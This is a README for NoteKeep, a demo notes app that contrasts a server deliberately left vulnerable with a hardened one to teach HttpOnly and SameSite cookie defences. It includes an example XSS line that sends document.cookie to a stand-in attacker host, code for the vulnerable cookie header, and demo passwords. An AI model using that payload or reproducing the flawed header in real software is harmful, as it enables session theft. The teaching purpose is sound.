# Session Authentication — NoteKeep

NoteKeep is a personal notes app that demonstrates session-based authentication: login creates a server-side session, the browser stores a cookie, and every request sends that cookie for validation.

---

## Port Reference

| Port | File | Role |
|------|------|------|
| 3052 | `session-server.js` | Vulnerable — cookie without HttpOnly |
| 3053 | `guide-server.js` | Concept guide — lifecycle + cookie attributes |
| 3054 | `session-hardened-server.js` | Hardened — HttpOnly + SameSite=Strict |

---

## How It Works

```
LOGIN:
  POST /api/login { username, password }
          ↓
  sessions.set("a3f9b2c1...", { username: "alice" })
          ↓
  Set-Cookie: nk_session=a3f9b2c1...; Path=/; [HttpOnly]; SameSite=Strict
          ↓
  Browser stores cookie in HTTP-only cookie jar

EVERY SUBSEQUENT REQUEST:
  Cookie: nk_session=a3f9b2c1...   ← browser adds automatically
          ↓
  sessions.get("a3f9b2c1...") → { username: "alice" } → authorized
```

On logout, `POST /api/logout` calls `sessions.delete("a3f9b2c1...")` and the token is immediately invalid.

---

## The Vulnerability

`Set-Cookie: nk_session=a3f9b2c1...; Path=/; SameSite=Lax` — missing `HttpOnly`.

Missing `HttpOnly` flag means JavaScript can read the session cookie.
Any XSS payload — a stored comment, reflected query param, or injected script — can exfiltrate the token:

```js
// Attacker's XSS payload:
fetch('https://attacker.com/steal?c=' + document.cookie);
// Result: attacker receives "nk_session=a3f9b2c1d4e5f6..."
// They can now make authenticated requests as alice from any machine.
```

The session remains valid until the user explicitly logs out. The server has no way to tell
the legitimate user's requests from the attacker's — both send the same cookie.

`document.cookie` returns `"nk_session=a3f9b2c1..."` — any XSS payload can read and exfiltrate it.

Missing `SameSite` also enables CSRF: a form on `attacker.com` can POST to `localhost:3052/api/*`
and the browser will attach the session cookie automatically.

---

## The Fix

`Set-Cookie: nk_session=a3f9b2c1...; Path=/; HttpOnly; SameSite=Strict`

`document.cookie` returns `""` — browser sends the cookie automatically but JS cannot see it.

---

## How to Run

```bash
cd auth-concepts/session
npm install
npm run vulnerable  # terminal 1 → localhost:3052
npm run guide       # terminal 2 → localhost:3053
npm run secure      # terminal 3 → localhost:3054
```

---

## Demo Walkthrough

1. Open **localhost:3052** — sign in as `alice` / `pass1234`.
2. On the dashboard, note the amber box showing `document.cookie` with your `nk_session` token visible.
3. Open DevTools console and run `document.cookie` — the full session token is readable.

---

## Hardened Demo

1. Open `localhost:3054` — login as `alice / pass1234`
2. Run `document.cookie` in DevTools console — returns `""` (HttpOnly blocks it)
3. The dashboard still loads correctly — the browser sends the cookie automatically
4. Open `localhost:3052` — same flow — `document.cookie` returns the full `nk_session=...` string

---

## Vulnerable Lines

```js
// ⚠️ VULNERABLE — no HttpOnly flag; JavaScript can read this cookie with document.cookie
// ⚠️ VULNERABLE — SameSite=Lax not Strict; cross-site POST requests still carry this cookie (CSRF possible)
res.setHeader('Set-Cookie', `nk_session=${sid}; Path=/; SameSite=Lax`);
```

---

## Defense Details

### HttpOnly — blocks JavaScript access

HttpOnly is a browser instruction, not server enforcement. The cookie is still sent automatically on every request to the origin; JavaScript simply cannot read it via `document.cookie`. An XSS payload can no longer exfiltrate the session token string, though it can still make same-origin authenticated requests if XSS is present.

### SameSite=Strict — blocks cross-site sending

SameSite controls when the browser attaches the cookie to cross-origin requests. `Lax` allows GET navigations from external sites (e.g. clicking a link in email). `Strict` blocks even those — the cookie is only sent on requests initiated from the same site. This eliminates CSRF where a malicious page submits a form or fetch to your API with the victim's cookie attached.

### Why this isn't a complete defense

HttpOnly + SameSite stops cookie theft via `document.cookie` and CSRF via cross-site form submission, but doesn't stop an attacker who already has XSS from making authenticated `fetch()` calls directly (same-origin). Defense-in-depth requires CSP, output encoding, and parameterized queries too.

---

## Credentials

| Username | Password |
|----------|----------|
| alice | pass1234 |
| bob | qwerty123 |
